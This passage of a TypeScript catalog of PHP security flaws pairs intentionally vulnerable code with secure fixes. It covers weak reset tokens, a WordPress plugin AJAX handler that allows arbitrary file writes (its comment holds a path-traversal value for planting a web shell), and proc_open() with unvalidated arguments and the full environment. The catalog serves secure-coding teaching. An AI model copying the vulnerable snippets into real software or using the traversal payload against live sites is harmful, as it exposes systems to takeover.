      "mt_rand() is a Mersenne Twister PRNG, not cryptographically secure — its internal state can sometimes be recovered from a handful of outputs, and uniqid() is largely a function of the current timestamp. Either way the search space is far smaller than it looks, letting an attacker who can request resets for a known account and observe timing/other tokens eventually guess or narrow down a valid one.",
    mitigation: [
      "Use random_bytes()/random_int() (PHP's CSPRNG) for anything security-sensitive — tokens, CSRF values, API keys",
      "Store only a hash of the token server-side, compare with hash_equals()",
      "Expire tokens quickly and invalidate them after first use",
    ],
    tags: ["weak-crypto", "token", "auth"],
    cvss: 7.5,
    references: [{ title: "PHP Manual: random_bytes()", url: "https://www.php.net/manual/en/function.random-bytes.php" }],
  },
  {
    id: "wordpress-plugin-arbitrary-upload",
    name: "Arbitrary File Write in a Vulnerable CMS Plugin Pattern",
    cwe: 434,
    severity: Severity.CRITICAL,
    type: VulnType.FILE_UPLOAD,
    phpVersions: ["7.4", "8.0", "8.1"],
    description:
      "A common real-world pattern in WordPress/CMS plugins: an AJAX action intended to save a configuration file writes attacker-controlled content to an attacker-controlled path inside the webroot, without verifying both the acting user's capability and the target path.",
    vulnerableCode: `<?php
// wp-content/plugins/example/ajax.php
add_action('wp_ajax_save_template', function () {
    $path = $_POST['path'];           // e.g. "../../../uploads/shell.php"
    $content = $_POST['content'];     // attacker-supplied PHP
    file_put_contents(WP_CONTENT_DIR . '/' . $path, $content);
    wp_send_json_success();
});`,
    secureCode: `<?php
// wp-content/plugins/example/ajax.php
add_action('wp_ajax_save_template', function () {
    if (!current_user_can('manage_options') || !check_ajax_referer('save_template', false, false)) {
        wp_send_json_error('forbidden', 403);
    }

    $name = sanitize_file_name($_POST['name'] ?? '');
    $allowedExt = ['.html', '.txt'];
    if ($name === '' || !in_array(strrchr($name, '.'), $allowedExt, true)) {
        wp_send_json_error('invalid name', 400);
    }

    $target = trailingslashit(WP_CONTENT_DIR . '/templates') . $name;
    file_put_contents($target, wp_kses_post($_POST['content'] ?? ''));
    wp_send_json_success();
});`,
    explanation:
      "This is the shape behind dozens of real CVEs in WordPress/Joomla plugins: a privileged-looking AJAX action is reachable by any logged-in (sometimes any unauthenticated) user because it never checks current_user_can() or a nonce, and it never restricts the destination path or file extension — so the attacker simply writes a .php file with a path-traversal path and gets a web shell.",
    mitigation: [
      "Every state-changing AJAX/REST handler must check both capability (current_user_can) and a nonce",
      "Never build a write path from user input without basename()/allow-listing the extension and directory",
      "Keep plugins/dependencies patched — this exact pattern recurs across the CMS plugin ecosystem",
    ],
    tags: ["cms", "plugin", "upload", "rce"],
    cvss: 9.8,
    references: [{ title: "WPScan Vulnerability Database", url: "https://wpscan.com/vulnerabilities/" }],
  },
  {
    id: "insecure-proc-open-env",
    name: "Environment Variable Injection via proc_open()",
    cwe: 78,
    severity: Severity.HIGH,
    type: VulnType.COMMAND_INJECTION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "proc_open()/exec() calls that pass an array of arguments are safe from shell metacharacter injection, but remain vulnerable if the attacker can control which binary is invoked or inject extra environment variables that the called program trusts (e.g. PATH, LD_PRELOAD, or an interpreter's own env-based config).",
    vulnerableCode: `<?php
// convert.php
$format = $_GET['format']; // attacker-controlled
proc_open(
    ['convert', $inputFile, "output.$format"],
    [], $pipes,
    null,
    $_ENV // passes the FULL current environment through, unfiltered
);`,
    secureCode: `<?php
// convert.php
$allowedFormats = ['png', 'jpg', 'webp'];
$format = $_GET['format'] ?? '';

if (!in_array($format, $allowedFormats, true)) {
    http_response_code(400);
    exit('Unsupported format');
}

proc_open(
    ['/usr/bin/convert', $inputFile, "output.$format"], // array form, no shell parsing
    [], $pipes,
    null,
    ['PATH' => '/usr/bin'] // minimal, explicit environment only
);`,
    explanation:
      "Even with the array-argument form (which avoids classic shell-metacharacter injection), passing an unvalidated 'format' value lets an attacker request formats that trigger dangerous ImageMagick coders (the historical 'ImageTragick' class of bugs), and passing the full ambient environment can leak secrets to the child process or let variables like LD_PRELOAD influence it if the attacker can also write files.",
    mitigation: [
      "Always use the array form of exec/proc_open arguments, never a concatenated shell string",
      "Still validate every argument against an allow-list even in array form",
      "Pass an explicit, minimal environment array rather than forwarding $_ENV",
      "Keep image/document-processing libraries patched against coder-specific RCEs",
    ],
    tags: ["command-injection", "proc_open", "imagetragick"],
    cvss: 8.2,
    references: [{ title: "PHP Manual: proc_open()", url: "https://www.php.net/manual/en/function.proc-open.php" }],
  },
];

export function getVulnerabilityById(id: string): Vulnerability | undefined {
  return vulnerabilities.find((v) => v.id === id);
}

export function getAllCwes(): number[] {
  return Array.from(new Set(vulnerabilities.map((v) => v.cwe))).sort((a, b) => a - b);
}

export function getAllTags(): string[] {
  return Array.from(new Set(vulnerabilities.flatMap((v) => v.tags))).sort();
}
